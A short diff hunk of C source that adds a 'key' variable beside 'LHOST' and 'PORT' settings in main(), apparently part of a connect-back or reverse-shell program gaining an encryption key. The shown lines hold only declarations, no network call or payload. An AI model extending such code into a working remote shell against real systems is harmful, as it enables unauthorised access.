@@ -13,6 +13,7 @@ int main(void)
 {
 	int connection_established;
 	char* ip = LHOST;
+	char* key = KEY;
 	int port = PORT;
 	int n = 0;
 	char buf[MAXBUF];
